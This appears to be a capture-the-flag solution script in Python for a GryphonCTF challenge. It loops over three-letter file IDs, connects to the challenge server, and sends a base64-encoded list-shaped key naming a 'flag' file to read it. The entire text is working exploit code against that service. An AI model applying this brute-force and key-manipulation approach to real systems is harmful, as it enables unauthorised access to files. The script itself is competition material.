#!/usr/bin/env python3
import socket
import base64
import string

def combinations():
    for a in string.ascii_uppercase:
        for b in string.ascii_uppercase:
            for c in string.ascii_uppercase:
                yield a + b + c

skip = True
for id in combinations():
    if 'RAH' == id:
        skip = False
        continue
    if skip:
        continue

    s = socket.socket()
    s.connect(('pwn1.chal.gryphonctf.com', 17342))

    while True:
        data = s.recv(4096).decode().strip()
        if not data:
            continue

        print("Received:", data)

        if 'YOUR INPUT =>' in data:
            # b)  VIEW FILE
            s.send(b'b\n')
            continue
        elif 'PLEASE INPUT KEY!' in data:
            key = f"['files/{id}', 'flag']"
            payload = base64.b64encode(key.encode())
            print(payload, key)
            s.send(payload + b'\n')
            continue

        if 'GCTF' in data:
            quit()
        if 'GOODBYE' in data:
            break

